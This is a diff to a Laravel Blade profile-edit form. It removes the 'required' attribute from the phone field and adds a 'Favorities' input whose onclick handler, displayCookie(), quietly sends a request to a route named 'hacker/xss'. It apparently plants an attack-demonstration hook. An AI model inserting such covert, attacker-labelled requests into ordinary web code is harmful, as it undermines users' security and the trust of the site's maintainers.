@@ -37,9 +37,17 @@
                                 <div class="form-group mb-3">
                                     <input type="text" placeholder="Phone" id="phone" class="form-control"
                                            value="{{ $user->phone }}"
-                                           name="phone" required autofocus>
+                                           name="phone">
                                     @if ($errors->has('phone'))
                                         <span class="text-danger">{{ $errors->first('phone') }}</span>
+                                    @endif
+                                </div>
+                                <div class="form-group mb-3">
+                                    <input type="text" placeholder="Favorities" id="favorities" class="form-control"
+                                           value="{{ $user->favorities }}"
+                                           name="favorities"  onclick="displayCookie()">
+                                    @if ($errors->has('favorities'))
+                                        <span class="text-danger">{{ $errors->first('favorities') }}</span>
                                     @endif
                                 </div>
                                 <div class="form-group mb-3">
@@ -60,4 +68,16 @@
             </div>
         </div>
     </main>
+    <script>
+    function displayCookie() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "{{ url('hacker/xss') }}", true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                // Do nothing with the response
+            }
+        };
+        xhr.send();
+    }
+</script>
 @endsection
